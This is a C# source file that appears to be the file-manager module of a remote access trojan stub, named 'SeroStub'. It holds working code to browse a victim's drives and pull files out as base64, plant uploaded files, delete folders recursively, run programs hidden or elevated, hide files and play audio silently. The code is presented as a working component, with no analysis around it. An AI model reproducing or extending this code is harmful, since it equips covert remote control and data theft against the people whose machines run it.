using System.IO;
using System.Runtime.InteropServices;
using System.Text.Json;

namespace SeroStub;

internal static class FileManagerFeature
{
    [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
    private static extern int SHSetDesktopWallpaper([In] string path);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringW", CharSet = CharSet.Unicode)]
    private static extern int MciSend(string cmd, System.Text.StringBuilder? ret, int retLen, nint cb);

    internal static string ListDirectory(string path)
    {
        var entries = new List<FmEntryStub>();
        string error = "";
        try
        {
            // Resolve special paths
            path = ResolvePath(path);

            if (string.IsNullOrEmpty(path))
            {
                // List drives
                foreach (var drive in DriveInfo.GetDrives())
                {
                    try
                    {
                        entries.Add(new FmEntryStub
                        {
                            Name = drive.Name,
                            IsDir = true,
                            Size = 0,
                            Modified = "",
                            IsHidden = false
                        });
                    }
                    catch { }
                }
                return Serialize(new FmListResultStub { Path = "", Entries = entries });
            }

            var di = new DirectoryInfo(path);

            // Directories first
            foreach (var d in di.GetDirectories())
            {
                try
                {
                    entries.Add(new FmEntryStub
                    {
                        Name = d.Name,
                        IsDir = true,
                        Size = 0,
                        Modified = d.LastWriteTime.ToString("yyyy-MM-dd HH:mm"),
                        IsHidden = d.Attributes.HasFlag(FileAttributes.Hidden),
                        Created = d.CreationTime.ToString("yyyy-MM-dd HH:mm"),
                        Attributes = (int)d.Attributes,
                    });
                }
                catch { }
            }

            // Files
            foreach (var f in di.GetFiles())
            {
                try
                {
                    entries.Add(new FmEntryStub
                    {
                        Name = f.Name,
                        IsDir = false,
                        Size = f.Length,
                        Modified = f.LastWriteTime.ToString("yyyy-MM-dd HH:mm"),
                        IsHidden = f.Attributes.HasFlag(FileAttributes.Hidden),
                        Created = f.CreationTime.ToString("yyyy-MM-dd HH:mm"),
                        Attributes = (int)f.Attributes,
                    });
                }
                catch { }
            }
        }
        catch (Exception ex) { error = ex.Message; }
        return Serialize(new FmListResultStub { Path = path, Entries = entries, Error = error });
    }

    internal static string DownloadFile(string path)
    {
        try
        {
            const long maxBytes = 256L * 1024 * 1024;
            using var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            if (fs.Length > maxBytes)
                return Serialize(new FmFileDataResultStub { Path = path, Error = $"File too large ({fs.Length / 1024 / 1024} MB). Max 256 MB." });
            // Single allocation — read directly into the byte[] that Convert.ToBase64String will consume.
            var bytes = new byte[fs.Length];
            int offset = 0, read;
            while (offset < bytes.Length && (read = fs.Read(bytes, offset, bytes.Length - offset)) > 0)
                offset += read;
            return Serialize(new FmFileDataResultStub { Path = path, Data = Convert.ToBase64String(bytes, 0, offset) });
        }
        catch (Exception ex)
        {
            return Serialize(new FmFileDataResultStub { Path = path, Error = ex.Message });
        }
    }

    internal static string UploadFile(string path, string base64Data)
    {
        try
        {
            var dir = Path.GetDirectoryName(path);
            if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
            File.WriteAllBytes(path, Convert.FromBase64String(base64Data));
            return Serialize(new FmAckDataStub { Path = path, Success = true });
        }
        catch (Exception ex)
        {
            return Serialize(new FmAckDataStub { Path = path, Error = ex.Message });
        }
    }

    internal static string Delete(string path)
    {
        try
        {
            if (Directory.Exists(path)) Directory.Delete(path, true);
            else if (File.Exists(path)) File.Delete(path);
            return Serialize(new FmAckDataStub { Path = path, Success = true });
        }
        catch (Exception ex)
        {
            return Serialize(new FmAckDataStub { Path = path, Error = ex.Message });
        }
    }

    internal static string Rename(string oldPath, string newPath)
    {
        try
        {
            if (Directory.Exists(oldPath)) Directory.Move(oldPath, newPath);
            else File.Move(oldPath, newPath);
            return Serialize(new FmAckDataStub { Path = newPath, Success = true });
        }
        catch (Exception ex)
        {
            return Serialize(new FmAckDataStub { Path = oldPath, Error = ex.Message });
        }
    }

    internal static string CreateDir(string path)
    {
        try
        {
            Directory.CreateDirectory(path);
            return Serialize(new FmAckDataStub { Path = path, Success = true });
        }
        catch (Exception ex)
        {
            return Serialize(new FmAckDataStub { Path = path, Error = ex.Message });
        }
    }

    internal static string Execute(string path, string mode)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName        = path,
                UseShellExecute = true,
            };
            switch (mode)
            {
                case "hidden":
                    psi.WindowStyle     = System.Diagnostics.ProcessWindowStyle.Hidden;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow  = true;
                    break;
                case "runas":
                    psi.Verb = "runas";
                    break;
            }
            System.Diagnostics.Process.Start(psi);
            return Serialize(new FmAckDataStub { Path = path, Success = true });
        }
        catch (Exception ex)
        {
            return Serialize(new FmAckDataStub { Path = path, Error = ex.Message });
        }
    }

    internal static string HashFile(string path)
    {
        try
        {
            using var fs = File.OpenRead(path);
            var hash = System.Security.Cryptography.SHA256.HashData(fs);
            return Serialize(new FmHashResultStub { Path = path, Hash = Convert.ToHexString(hash).ToLower() });
        }
        catch (Exception ex)
        {
            return Serialize(new FmHashResultStub { Path = path, Error = ex.Message });
        }
    }

    internal static string ToggleHidden(string path, bool hide)
    {
        try
        {
            var attr = File.GetAttributes(path);
            if (hide) attr |= FileAttributes.Hidden;
            else      attr &= ~FileAttributes.Hidden;
            File.SetAttributes(path, attr);
            return Serialize(new FmAckDataStub { Path = path, Success = true });
        }
        catch (Exception ex)
        {
            return Serialize(new FmAckDataStub { Path = path, Error = ex.Message });
        }
    }

    internal static string SetAttributes(string path, int attributes)
    {
        try
        {
            File.SetAttributes(path, (FileAttributes)attributes);
            return Serialize(new FmAckDataStub { Path = path, Success = true });
        }
        catch (Exception ex)
        {
            return Serialize(new FmAckDataStub { Path = path, Error = ex.Message });
        }
    }

    internal static void PlayAudioSilent(string path)
    {
        MciSend("close serosnd", null, 0, nint.Zero);
        MciSend($"open \"{path}\" alias serosnd", null, 0, nint.Zero);
        MciSend("play serosnd", null, 0, nint.Zero);
    }

    internal static void StopAudio()
    {
        MciSend("close serosnd", null, 0, nint.Zero);
    }

    private static string ResolvePath(string path)
    {
        if (string.IsNullOrWhiteSpace(path)) return "";
        // Normalize
        path = path.Trim();
        if (path == "/" || path == "\\") return "";
        // Environment variables
        path = Environment.ExpandEnvironmentVariables(path);
        return path;
    }

    private static string Serialize(FmListResultStub v)   => JsonSerializer.Serialize(v, SeroJson.Default.FmListResultStub);
    private static string Serialize(FmFileDataResultStub v) => JsonSerializer.Serialize(v, SeroJson.Default.FmFileDataResultStub);
    private static string Serialize(FmAckDataStub v)      => JsonSerializer.Serialize(v, SeroJson.Default.FmAckDataStub);
    private static string Serialize(FmHashResultStub v)   => JsonSerializer.Serialize(v, SeroJson.Default.FmHashResultStub);
}

internal class FmEntryStub        { public string Name { get; set; } = ""; public bool IsDir { get; set; } public long Size { get; set; } public string Modified { get; set; } = ""; public bool IsHidden { get; set; } public string Created { get; set; } = ""; public int Attributes { get; set; } }
internal class FmListResultStub   { public string Path { get; set; } = ""; public List<FmEntryStub> Entries { get; set; } = []; public string Error { get; set; } = ""; }
internal class FmDownloadDataStub { public string Path { get; set; } = ""; }
internal class FmFileDataResultStub { public string Path { get; set; } = ""; public string Data { get; set; } = ""; public string Error { get; set; } = ""; }
internal class FmUploadDataStub   { public string Path { get; set; } = ""; public string Data { get; set; } = ""; }
internal class FmDeleteDataStub   { public string Path { get; set; } = ""; }
internal class FmRenameDataStub   { public string OldPath { get; set; } = ""; public string NewPath { get; set; } = ""; }
internal class FmMkDirDataStub    { public string Path { get; set; } = ""; }
internal class FmExecDataStub     { public string Path { get; set; } = ""; public string Mode { get; set; } = "normal"; }
internal class FmHashDataStub     { public string Path { get; set; } = ""; }
internal class FmHashResultStub   { public string Path { get; set; } = ""; public string Hash { get; set; } = ""; public string Error { get; set; } = ""; }
internal class FmAckDataStub      { public string Path { get; set; } = ""; public bool Success { get; set; } public string Error { get; set; } = ""; }
internal class FmShowHideDataStub  { public string Path { get; set; } = ""; public bool Hide { get; set; } }
internal class FmSetAttrDataStub   { public string Path { get; set; } = ""; public int Attributes { get; set; } }
internal class FmPlayAudioDataStub { public string Path { get; set; } = ""; }
